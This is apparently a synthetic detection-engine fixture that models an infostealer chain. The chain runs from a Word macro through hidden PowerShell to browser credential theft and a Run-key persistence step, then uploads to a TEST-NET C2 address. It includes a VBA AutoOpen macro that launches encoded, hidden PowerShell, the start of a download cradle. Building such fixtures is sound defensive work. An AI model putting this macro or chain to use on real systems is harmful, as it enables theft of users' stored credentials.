#: SYNTHESISED, not captured from a live infection. Modelled on public reporting for commodity browser stealers (RedLine/Vidar/Raccoon class): maldoc -> hidden encoded PowerShell -> browser credential stores -> zip staged in %TEMP% -> dynamic-DNS C2 -> upload.

The C2 address is 203.0.113.77, inside RFC 5737 TEST-NET-3. It is routable as far as the engine's private-range check is concerned but can never resolve to a real host, so this file is safe to ship and can never be mistaken for a live IOC.

meta.name: infostealer-chain
meta.description: A macro in an emailed .doc spawns hidden encoded PowerShell, which copies the Chrome credential store and its DPAPI key material, adds Firefox logins, stages a zip in the user's Temp directory, installs a Run key, resolves a dynamic-DNS name and uploads over TLS 1.4 s later.

detail: already running; recorded so the ancestry of the maldoc resolves
attachment opened from Outlook's temp download folder by the user

scriptText:
Sub AutoOpen()
  Dim c
  c = "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
  CreateObject("WScript.Shell").Run c, 0, False
End Sub
